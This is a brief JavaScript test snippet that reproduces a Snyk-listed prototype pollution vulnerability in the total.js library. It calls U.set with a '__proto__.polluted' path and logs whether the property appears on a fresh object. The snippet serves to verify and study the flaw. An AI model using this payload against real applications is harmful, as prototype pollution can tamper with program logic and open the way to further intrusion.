// //https://snyk.io/vuln/SNYK-JS-TOTALJS-1046671
// test("prototype pollution in total.js", () => {
  const total = require("total.js");
  obj = {};

console.log({}.polluted);

  U.set({}, "__proto__.polluted", "yes");
console.log({}.polluted);
// });
